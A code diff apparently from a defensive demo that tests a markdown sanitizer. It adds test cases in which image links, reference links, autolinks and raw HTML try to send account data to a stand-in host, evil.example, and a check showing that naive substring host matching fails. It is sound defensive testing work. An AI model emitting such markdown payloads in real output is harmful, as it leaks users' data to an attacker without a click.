@@ -7,7 +7,8 @@
 //
 //   Sink 1  HTML      encode before it touches the page
 //   Sink 2  Markdown  links and images only to allow-listed hosts (an image
-//                     URL is a request the browser sends without a click)
+//                     URL is a request the browser sends without a click),
+//                     found by parsing, not by a regex; raw HTML removed
 //   Sink 3  SQL       parameters, never concatenation (real in-memory SQLite)
 //
 // No model: the answers are fixed strings, so every run is the same.
@@ -57,12 +58,26 @@ SafeMarkdown markdown = new(["contoso.example", "learn.microsoft.com"]);
      "click [link removed: not https]"),
     ("[plain](http://contoso.example/policies)",
      "plain [link removed: not https]"),
+    // Forms a regex over [label](url) misses; a CommonMark renderer follows every one.
+    ("![s](https://evil.example/p.png?d=E-1001-balance-500 \"status\")",
+     "[image removed: evil.example]"),
+    ("![s]( https://evil.example/p.png?d=E-1001-balance-500)",
+     "[image removed: evil.example]"),
+    ("![s][1]\n\n[1]: https://evil.example/p.png?d=E-1001-balance-500",
+     "[image removed: evil.example]\n\n[link definition removed: evil.example]"),
+    ("<https://evil.example/?d=E-1001-balance-500>",
+     "[link removed: evil.example]"),
+    ("[portal](https://evil.example/login 'Contoso portal')",
+     "portal [link removed: evil.example]"),
+    ("<img src=\"https://evil.example/p.png?d=E-1001-balance-500\">",
+     "[html removed]"),
 ];
 foreach ((string input, string expected) in links)
 {
     string rendered = markdown.Render(input);
-    Expect($"{input} -> {rendered}", rendered == expected);
+    Expect($"{Shown(input)} -> {Shown(rendered)}", rendered == expected);
 }
+static string Shown(string s) => s.Replace("\n", "\\n", StringComparison.Ordinal);
 Expect("DEFECT REPRODUCED: a substring host check accepts contoso.example.evil.example",
     SafeMarkdown.NaiveSubstringCheck("https://contoso.example.evil.example/login", "contoso.example"));
 Expect("DEFECT REPRODUCED: a substring host check accepts evil.example/?ref=contoso.example",
